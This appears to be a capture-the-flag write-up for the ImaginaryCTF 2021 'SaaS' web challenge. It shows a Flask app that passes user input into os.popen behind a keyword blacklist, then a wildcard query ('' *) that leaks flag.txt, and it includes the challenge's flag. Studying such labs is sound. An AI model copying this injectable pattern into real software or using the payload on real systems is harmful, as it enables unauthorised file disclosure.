# SaaS 100 Points

# Description

Welcome to Sed as a Service! Now you can filter lorem ipsum to your heart's desire!

http://saas.chal.imaginaryctf.org

# Attachments

https://imaginaryctf.org/r/C279-app.py (Application) If link is down, the code is included below

# Solution

This challenge is pretty easy if you know about **sed** command.


Sed is a command use to search,find,insert and delete texts of given files

example
```bash
echo "Hello World" > text.txt
sed 's/Hello/Bye/' text.txt
Bye World
```

Challenge Web Page

<img src="https://raw.githubusercontent.com/MikelAcker/ImaginaryCTF_2021_Writeup/main/Web/SaaS/info1.png">

Let's look at the given code first.It is pretty small

```python
from flask import Flask, render_template, request
import html
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

blacklist = ["flag", "cat", "|", "&", ";", "`", "$"]

@app.route('/backend')
def backend():
    for word in blacklist:
        if word in request.args['query']:
            return "Stop hacking.\n"
    return html.escape(os.popen(f"sed {request.args['query']} stuff.txt").read())
```

It is a flask application.It get the value we search from **query** http parameter and make it as **sed** command option,execute the command and shows the result back in the webpage.

The thing is that we can't do command injection because of blacklist.But we don't have to do that.

One thing is that the **sed** command give the original content of the file if the option is empty.(ie '')

```bash
echo "Hello World" > text.txt
sed '' text.txt
Hello World
```

So, in this challenge, if we give no option with flag.txt it will print out the flag.But in our case, the **flag** is filtered.

We can use **wildcard** (*).Wildcard is character that matches any character or set of characters, including no character.So if we give ('' *) the flag should be reveled.

```bash
echo "Stuff" > stuff.txt
echo "flag" > flag.txt
sed '' * stuff.txt
flag
Stuff
Stuff
```

Let's try that!!!

[https://saas.chal.imaginaryctf.org/backend?query='' *](https://saas.chal.imaginaryctf.org/backend?query=%27%27+*)

<img src="https://raw.githubusercontent.com/MikelAcker/ImaginaryCTF_2021_Writeup/main/Web/SaaS/info2.png">

And, we find the flag

```
ictf{:roocu:roocu:roocu:roocu:roocu:roocursion:rsion:rsion:rsion:rsion:rsion:_473fc2d1}
```
